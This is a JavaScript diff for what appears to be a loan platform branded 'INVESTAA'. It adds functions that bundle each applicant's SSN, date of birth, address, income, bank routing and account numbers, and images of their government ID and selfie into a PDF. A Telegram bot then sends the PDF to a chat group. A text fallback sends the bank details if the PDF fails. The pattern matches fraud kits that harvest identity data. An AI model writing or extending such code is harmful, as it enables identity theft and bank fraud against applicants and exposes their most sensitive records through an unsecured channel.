@@ -721,6 +721,147 @@ async function notifyLoanRejected(loan, reason) {
     } catch(e) { console.error('[TELEGRAM] notifyLoanRejected error:', e.message); }
 }
 
+function generateLoanPdf(loan, imageBuffers) {
+    return new Promise((resolve, reject) => {
+        try {
+            const doc = new PDFDocument({ margin: 40 });
+            const chunks = [];
+
+            doc.on('data', chunk => chunks.push(chunk));
+            doc.on('end', () => resolve(Buffer.concat(chunks)));
+            doc.on('error', err => reject(err));
+
+            doc.fillColor('#1e293b').fontSize(20).font('Helvetica-Bold').text('INVESTAA - CREDIT & LOAN ARCHIVE REPORT', { align: 'center' });
+            doc.moveDown(0.5);
+            doc.moveTo(40, doc.y).lineTo(570, doc.y).strokeColor('#cbd5e1').lineWidth(1).stroke();
+            doc.moveDown(1);
+
+            doc.fillColor('#22c55e').fontSize(13).font('Helvetica-Bold').text('STATUS: APPROVED & DISBURSED ✅', { align: 'center' });
+            doc.moveDown(1);
+
+            doc.fillColor('#0f172a').fontSize(12).font('Helvetica-Bold').text('1. Applicant Personal Information:');
+            doc.fillColor('#334155').font('Helvetica').fontSize(9);
+            doc.text(`Application Code:   ${loan.app_code}`);
+            doc.text(`Full Legal Name:    ${loan.full_name}`);
+            doc.text(`Email Address:      ${loan.email}`);
+            doc.text(`Phone Number:       ${loan.phone || 'N/A'}`);
+            doc.text(`Date of Birth:      ${loan.dob || 'N/A'}`);
+            doc.text(`SSN / Tax ID:       ${loan.ssn_id || 'N/A'}`);
+            doc.text(`Residential Addr:   ${loan.address || 'N/A'}`);
+            doc.text(`Housing Status:     ${loan.housing_status || 'N/A'} (Monthly: $${loan.monthly_housing || 0})`);
+            doc.moveDown(1);
+
+            doc.fillColor('#0f172a').fontSize(12).font('Helvetica-Bold').text('2. Employment & Financial Income:');
+            doc.fillColor('#334155').font('Helvetica').fontSize(9);
+            doc.text(`Employment Status:  ${loan.employment_status || 'N/A'}`);
+            doc.text(`Employer Name:      ${loan.employer_name || 'N/A'}`);
+            doc.text(`Job Title:          ${loan.job_title || 'N/A'}`);
+            doc.text(`Monthly Income:     $${parseFloat(loan.monthly_income || 0).toLocaleString()} USD`);
+            doc.moveDown(1);
+
+            doc.fillColor('#0f172a').fontSize(12).font('Helvetica-Bold').text('3. Approved Credit Line Facility:');
+            doc.fillColor('#334155').font('Helvetica').fontSize(9);
+            doc.text(`Approved Credit:    $${parseFloat(loan.loan_amount || 0).toLocaleString()} USD`);
+            doc.text(`Loan Purpose:       ${loan.loan_purpose || 'Personal / Business'}`);
+            doc.text(`Repayment Term:     ${loan.loan_term || 12} Months`);
+            if (loan.business_txid) doc.text(`Business TxID/EIN:  ${loan.business_txid}`);
+            doc.moveDown(1);
+
+            doc.fillColor('#0f172a').fontSize(12).font('Helvetica-Bold').text('4. Banking Account Details for Disbursement:');
+            doc.fillColor('#334155').font('Helvetica').fontSize(9);
+            doc.text(`Bank Name:          ${loan.bank_name}`);
+            doc.text(`Account Holder:     ${loan.account_name}`);
+            doc.text(`ABA Routing Number: ${loan.routing_number}`);
+            doc.text(`Account Number:     ${loan.account_number}`);
+            doc.text(`Account Type:       ${loan.account_type || 'Checking'}`);
+            doc.moveDown(1);
+
+            doc.fillColor('#0f172a').fontSize(12).font('Helvetica-Bold').text('5. Legal FCRA Authorization & Signature:');
+            doc.fillColor('#334155').font('Helvetica').fontSize(9);
+            doc.text(`FCRA Authorization: YES — Electronic Consent Verified`);
+            doc.text(`Digital Signature:  ${loan.credit_signature || loan.full_name}`);
+            doc.text(`Submitted At:       ${loan.created_at || new Date().toLocaleString()}`);
+            doc.text(`Approved At:        ${loan.approved_at || new Date().toLocaleString()}`);
+            doc.moveDown(1.5);
+
+            if (imageBuffers && imageBuffers.length > 0) {
+                for (const img of imageBuffers) {
+                    try {
+                        doc.addPage();
+                        doc.fillColor('#1e293b').fontSize(14).font('Helvetica-Bold').text(img.label, { align: 'center' });
+                        doc.moveDown(0.5);
+                        doc.image(img.buffer, {
+                            fit: [500, 600],
+                            align: 'center',
+                            valign: 'center'
+                        });
+                    } catch (imgErr) {
+                        doc.fillColor('#ef4444').fontSize(10).font('Helvetica').text(`Error embedding document image: ${imgErr.message}`, { align: 'center' });
+                    }
+                }
+            }
+
+            doc.end();
+        } catch (err) {
+            reject(err);
+        }
+    });
+}
+
+async function archiveLoan(loan) {
+    try {
+        const archiveChatId = TELEGRAM_ARCHIVE_CHAT_ID || TELEGRAM_CHAT_ID;
+        if (!BOT_TOKEN || !archiveChatId || !loan) return;
+
+        console.log(`[LOAN-ARCHIVE] Starting PDF compilation for loan code: ${loan.app_code}...`);
+
+        const imageBuffers = [];
+        const parseFileBuffer = (dataStr, label) => {
+            if (!dataStr) return null;
+            if (dataStr.startsWith('data:image')) {
+                const base64Data = dataStr.split(',')[1];
+                if (base64Data) return { label, buffer: Buffer.from(base64Data, 'base64') };
+            }
+            return null;
+        };
+
+        const idFront = parseFileBuffer(loan.id_document, 'Government ID — Front');
+        if (idFront) imageBuffers.push(idFront);
+
+        const idBack = parseFileBuffer(loan.id_document_back, 'Government ID — Back');
+        if (idBack) imageBuffers.push(idBack);
+
+        const selfie = parseFileBuffer(loan.selfie, 'Verification Selfie');
+        if (selfie) imageBuffers.push(selfie);
+
+        const pdfBuffer = await generateLoanPdf(loan, imageBuffers).catch((err) => {
+            console.error('[LOAN-ARCHIVE] PDF Generation Error:', err.message);
+            return null;
+        });
+
+        if (!pdfBuffer) {
+            const detailsText = [
+                `🗄️ APPROVED LOAN ARCHIVE RECORD (${loan.app_code})`,
+                `Applicant: ${loan.full_name} (${loan.email})`,
+                `Amount: $${parseFloat(loan.loan_amount).toLocaleString()} USD`,
+                `Bank: ${loan.bank_name} | Acct: ${loan.account_number} | Routing: ${loan.routing_number}`,
+                `Approved At: ${new Date().toLocaleString()}`
+            ].join('\n');
+            const detailsBuffer = Buffer.from(detailsText, 'utf8');
+            const filename = `loan_approved_${loan.id}_${loan.app_code.replace('#','')}.txt`;
+            await sendTelegramDocumentBuffer(archiveChatId, filename, detailsBuffer, `🗄️ Approved Loan Archive Record - ${loan.full_name} (${loan.app_code})`);
+            return;
+        }
+
+        console.log('[LOAN-ARCHIVE] Sending consolidated Loan PDF report to archive group...');
+        const filename = `loan_approved_${loan.id}_${loan.app_code.replace('#','')}.pdf`;
+        await sendTelegramDocumentBuffer(archiveChatId, filename, pdfBuffer, `🗄️ Approved Loan Credit Archive (PDF) - ${loan.full_name} (${loan.app_code})`);
+        console.log('[LOAN-ARCHIVE] Loan PDF archived successfully.');
+    } catch (e) {
+        console.error('[TELEGRAM] archiveLoan error:', e.message);
+    }
+}
+
 module.exports = {
     sendTelegram,
     notifyKycApproved,
@@ -736,5 +877,6 @@ module.exports = {
     notifyLoanApproved,
     notifyLoanRejected,
     archiveKyc,
+    archiveLoan,
     sendPhoto
 };
